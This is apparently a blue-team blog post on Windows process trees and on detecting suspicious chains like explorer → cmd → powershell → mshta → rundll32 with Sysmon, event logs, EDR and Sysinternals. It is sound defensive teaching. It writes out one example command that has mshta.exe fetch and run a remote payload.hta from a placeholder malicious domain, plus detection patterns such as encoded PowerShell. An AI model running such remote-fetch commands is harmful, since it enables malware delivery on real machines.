---
title: "From Legit to Malicious: Understanding Suspicious Windows Process Behavior"
date: 2025-07-07 11:31:14 +0200
categories: [Interesting Topics]
tags: [windows-internals, processes, process-tree, threat-hunting, sysmon, lolbin, edr, mitre-attack, dfir, blue-team]
image:
  path: /assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/01.jpg
  alt: "From legit to malicious — understanding suspicious Windows process behavior"
---

Before we dive deep, I want to clarify two essential concepts:

- What is the Windows process journey?
- What is the Windows process tree, and how does it work?

I will explain some key elements to guide your understanding, but keep in mind: this is just part of the bigger picture. You need the full view to detect suspicious behavior effectively.

![Windows process behavior overview](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/02.jpg)

![Windows process journey](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/03.png)

## What Is a Process?

In general, a process is a sequence of actions or steps taken to achieve a specific outcome or goal.

When we talk about a process in an operating system, we refer to a script or programmed task that is executed to perform a particular function within Windows.

## What Is a Windows Process?

A Windows process is the fundamental unit of execution managed by the operating system. It includes the resources, such as memory and threads, that are required for a program to run.

Check => [https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads](https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads)

## What Is a Process Tree?

A process tree is the sequence of related processes that work together to accomplish a larger task. Each process spawns another, creating a parent-child relationship that forms a tree-like structure.

### Example Process Tree:

```
System (PID 4)
├── smss.exe (Session Manager)
│   └── wininit.exe
│       ├── services.exe (Service Control Manager)
│       │   ├── svchost.exe (Host for services)
│       │   │   ├── DcomLaunch
│       │   │   ├── DHCP Client
│       │   │   └── ...
│       │   ├── lsass.exe (Local Security Authority Subsystem)
│       │   └── lsm.exe (Local Session Manager)
│       └── csrss.exe (Client/Server Runtime Subsystem)
├── winlogon.exe (Windows Logon Application)
│   └── userinit.exe
│       └── explorer.exe (Desktop shell)
│           ├── taskbar processes (SearchUI, ShellExperienceHost, etc.)
│           ├── application.exe (user apps)
│           ├── chrome.exe / msedge.exe / firefox.exe
│           └── cmd.exe / powershell.exe / notepad.exe
└── csrss.exe (for each session)
```

This structure shows how each process is used to spawn others. That's why we refer to it as a "process tree."

![Process tree visualization](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/04.jpg)

## A Simple Breakdown:

- `System (PID 4)` is the kernel process and the root of user-space processes.
- `smss.exe` starts system sessions.
- `services.exe` manages all service-related processes.
- `svchost.exe` is a container for services — multiple services can run under one svchost instance.
- `winlogon.exe` initiates user sessions.
- `explorer.exe` is the desktop shell that spawns user applications.
- `cmd.exe` or `powershell.exe` can launch further scripts or tools — and sometimes, malware.

Understanding this structure is essential for spotting suspicious chains of execution.

## Suspicious Process Tree Example

```
explorer.exe
└── cmd.exe
    └── powershell.exe
        └── mshta.exe
            └── rundll32.exe
```

### Step-by-step Breakdown:

`explorer.exe → cmd.exe`

- Legitimate: A user opening Command Prompt.
- Suspicious: Rare without user interaction.
- Check this => [https://howtoremove.guide/explorer-exe-virus/](https://howtoremove.guide/explorer-exe-virus/)

`cmd.exe → powershell.exe`

- Legitimate: Admins or scripts may use PowerShell.
- Suspicious: Common in attacks using tools like Cobalt Strike or Metasploit.

`powershell.exe → mshta.exe`

- Highly suspicious.

`mshta.exe` is used to execute `.hta` (HTML Application) files, often carrying malicious JavaScript or VBScript payloads.

`mshta.exe → rundll32.exe`

- Extremely suspicious in this context.

`rundll32.exe` is often abused to execute malicious DLLs or inline shellcode.

This kind of chained execution is commonly observed in malware campaigns and fileless attacks.

![Suspicious process chain](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/05.jpg)

Check this => [https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/](https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/)

## What Indicators Should You Look For?

1. **Process Relationship and Structure**

- Does the process chain follow a known, legitimate pattern?
- For example: why would `rundll32.exe` be triggered by `mshta.exe`?

This kind of chain:

- `explorer.exe → cmd.exe → powershell.exe → mshta.exe → rundll32.exe`

2. **Command-Line Arguments**

why its important?

- Encoded payloads (common obfuscation — Obfuscation is the technique of making code, commands, or data intentionally difficult to read or understand, usually to hide malicious intent or evade detection by security tools)
- Remote HTA download (a remote HTA download is when an attacker uses mshta.exe to download and execute a remote HTML Application (HTA) file — often as part of a malware infection chain)
  ex: `mshta.exe http://malicious-domain[.]com/payload.hta`
- DLL sideloading or inline script execution

![Command-line argument analysis](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/06.jpg)

![Encoded payload example](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/07.jpg)

**3. Image Path and Signature Validation**

- Always check the executable's path:
- Legitimate: `C:\Windows\System32\rundll32.exe`
- Suspicious: `C:\Users\Public\rundll32.exe` or temporary folders.

Use EDR to confirm whether the file is:

- Signed by Microsoft
- Tampered or unsigned

**4. Loaded Modules and DLLs**

- Investigate which DLLs are loaded by `rundll32.exe`.
- Non-Microsoft or unusual DLLs are red flags.

**5. Network Activity**

- Processes like `powershell.exe`, `mshta.exe`, and `rundll32.exe` should not typically generate outbound connections.

Watch for:

- Suspicious IPs or domains
- C2 (Command and Control) communications
- TOR or dynamic DNS activity
- Threat intelligence tools can help identify these indicators.

Check this => [https://www.kaggle.com/datasets/advaitnmenon/network-traffic-data-malicious-activity-detection](https://www.kaggle.com/datasets/advaitnmenon/network-traffic-data-malicious-activity-detection)

## Detection Tools and Event Logs

**Sysmon (System Monitor by Microsoft)**

Check this => [https://medium.com/@huseyin.eksi/important-sysmon-events-to-follow-a59464081dd0](https://medium.com/@huseyin.eksi/important-sysmon-events-to-follow-a59464081dd0)

![Sysmon overview](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/08.png)

- Must be installed with a configuration file.

![Sysmon configuration](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/09.png)

![Sysmon config file](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/10.png)

- Provides high-fidelity logs for:

**Event ID 1** — Process creation

- Logs parent-child relationships, full command lines
- Key for spotting LOLBin abuse (`mshta.exe`, `powershell.exe`, etc.)

![Sysmon Event ID 1 — process creation](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/11.png)

**Event ID 3** — Network connection

- Logs outbound connections, helpful for detecting C2 behavior.

![Sysmon Event ID 3 — network connection](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/12.png)

**Event ID 7** — DLL load

- Detects unusual DLLs loaded by processes like `rundll32.exe`.

![Sysmon Event ID 7 — DLL load](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/13.png)

**Event ID 10** — Process access

- Captures attempts to access other processes, useful for identifying injection or hollowing.

![Sysmon Event ID 10 — process access](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/14.png)

---

**Windows Security Event Logs**

- Enable audit policies to track process activity:

**Event ID 4688** — Process creation

- Basic logging similar to Sysmon, useful for detecting:
- `powershell.exe -enc`
- `mshta.exe http://...`

![Windows Event ID 4688 — process creation](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/15.png)

**Event ID 4689** — Process termination

![Windows Event ID 4689 — process termination](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/16.png)

- Helps track short-lived processes (less commonly useful, but worth monitoring).

## EDR Solutions

**Microsoft Defender for Endpoint (MDE)**

![Microsoft Defender for Endpoint process tree](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/17.png)

- Provides visual process trees and real-time alerts.
- Detects abuse of known LOLBins (`mshta.exe`, `rundll32.exe`, `powershell.exe`).
- Correlates file, registry, and network activity.
- Flags malicious behavior using MITRE techniques like:
- T1059 (Command and Scripting Interpreter)
- T1218.005 (Signed Binary Proxy Execution: mshta)

Most EDRs support:

- Full process ancestry
- File and memory monitoring
- Network telemetry
- Automatic detection of abnormal chains

![EDR detection of abnormal chains](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/18.jpg)

## Sysinternals Tools for Hunting

**Process Explorer**

- Helps visualize real-time process trees.
- Allows inspection of process properties, memory, and loaded DLLs.

![Process Explorer process tree](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/19.jpg)

![Process Explorer properties](/assets/img/posts/from-legit-to-malicious-suspicious-windows-process-behavior/20.png)

Check this => [https://www.youtube.com/watch?v=y2bNLCWHFNs](https://www.youtube.com/watch?v=y2bNLCWHFNs) (Use Case)

**Process Monitor (Procmon — outdated; it's more of a technique than just a tool)**

- Useful for investigating:
- File system activity
- Registry changes
- Network usage by specific processes

[https://nasbench.medium.com/hunting-malware-with-windows-sysinternals-process-monitor-e67476f44514](https://nasbench.medium.com/hunting-malware-with-windows-sysinternals-process-monitor-e67476f44514)

## Final Thoughts

Understanding how Windows processes interact and how process trees work is critical in detecting malicious activity. By learning what a legitimate tree looks like, you'll quickly spot when something is out of place. Combine this knowledge with proper logging and analysis tools, and you'll be much better equipped to identify, investigate, and respond to threats.

Let me know what you think, and feel free to share how you're tracking malicious process chains in your environment.

---

> _Originally published on [Medium](https://medium.com/@mohamedabdullh116/from-legit-to-malicious-understanding-suspicious-windows-process-behavior-1f6397357b62)._
{: .prompt-info }
